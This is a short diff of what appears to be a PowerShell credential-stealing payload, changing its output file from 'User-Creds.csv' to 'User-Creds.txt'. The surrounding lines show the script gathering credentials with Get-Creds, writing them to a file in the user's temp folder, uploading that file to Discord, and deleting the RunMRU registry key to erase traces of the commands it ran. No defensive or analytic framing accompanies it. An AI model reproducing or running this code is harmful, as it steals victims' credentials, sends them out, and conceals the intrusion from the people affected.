@@ -1,7 +1,7 @@
 
 
 
-$FileName = "User-Creds.csv"
+$FileName = "User-Creds.txt"
  
 
 
@@ -98,7 +98,7 @@ $creds = Get-Creds
 
 echo $creds >> $env:TMP\$FileName
 
-Upload-Discord -file $env:TMP\User-Creds.csv
+Upload-Discord -file $env:TMP\User-Creds.txt
 
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 
